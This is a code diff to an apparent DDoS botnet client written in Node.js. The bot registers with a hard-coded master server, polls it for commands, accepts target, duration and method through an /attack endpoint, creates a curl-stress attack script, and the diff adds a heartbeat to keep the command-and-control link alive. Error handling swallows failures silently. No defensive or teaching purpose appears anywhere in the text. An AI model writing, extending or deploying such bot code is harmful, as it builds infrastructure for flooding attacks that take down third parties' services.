@@ -20,7 +20,7 @@ function generateBotId() {
 const BOT_ID = generateBotId();
 const BOT_NAME = process.env.BOT_NAME || `Bot-${Math.floor(Math.random() * 10000)}`;
 const MASTER_SERVER = process.env.MASTER_SERVER || 'https://hello-kutty-k7d3.onrender.com';
-const PORT = 0;
+const PORT = 0; // random port
 
 let registrationAttempts = 0;
 const MAX_REGISTRATION_ATTEMPTS = 5;
@@ -45,7 +45,7 @@ function ensureMethods() {
         console.log('[SETUP] Created methods directory');
     }
 
-    // Create curl-stress.js if it doesn't exist
+    // Create curl-stress.js
     const stressPath = path.join(methodsDir, 'curl-stress.js');
     if (!fs.existsSync(stressPath)) {
         const stressContent = `#!/usr/bin/env node
@@ -241,14 +241,9 @@ app.get('/ping', (req, res) => {
 
 app.get('/attack', (req, res) => {
     const { target, time, methods } = req.query;
-
     if (!target || !time || !methods) {
-        return res.status(400).json({
-            error: 'Missing parameters',
-            required: ['target', 'time', 'methods']
-        });
+        return res.status(400).json({ error: 'Missing parameters' });
     }
-
     console.log(`\n[RECEIVED] ${methods} -> ${target} for ${time}s`);
     res.status(200).json({ message: 'Attack command received', target, time, methods });
     executeAttack(target, time, methods);
@@ -259,12 +254,10 @@ const server = app.listen(PORT, () => {
     const address = server.address();
     serverPort = address.port;
     botUrl = `http://localhost:${serverPort}`;
-    
     console.log(`[INFO] Bot server running on port ${serverPort}`);
     console.log(`[INFO] Bot URL: ${botUrl}`);
     console.log(`[INFO] Bot ID: ${BOT_ID}`);
     console.log(`[INFO] Bot Name: ${BOT_NAME}\n`);
-    
     setTimeout(() => {
         autoRegister();
     }, 2000);
@@ -305,9 +298,16 @@ async function autoRegister() {
             console.log(`[INFO] Bot ID: ${BOT_ID}`);
             console.log(`[INFO] Ready for commands!\n`);
             
+            // Start command polling
             setInterval(() => {
                 checkForCommands();
             }, 3000);
+
+            // Start heartbeat every 25 seconds to keep connection alive
+            setInterval(() => {
+                sendHeartbeat();
+            }, 25000);
+            
             return;
         } else {
             registrationAttempts++;
@@ -323,6 +323,17 @@ async function autoRegister() {
         registrationAttempts++;
         console.error(`[ERROR] Registration failed: ${error.message}`);
         setTimeout(() => autoRegister(), 5000);
+    }
+}
+
+// ========== SEND HEARTBEAT ==========
+async function sendHeartbeat() {
+    try {
+        await axios.post(`${MASTER_SERVER}/heartbeat`, { id: BOT_ID }, { timeout: 5000 });
+        // Optional: log heartbeat (too noisy)
+        // console.log(`[HEARTBEAT] Sent`);
+    } catch (error) {
+        // Silently fail
     }
 }
 
@@ -345,7 +356,9 @@ async function checkForCommands() {
                 executeAttack(target, time, methods);
             }
         }
-    } catch (error) {}
+    } catch (error) {
+        // Silently fail
+    }
 }
 
 // ========== STOP ALL ==========
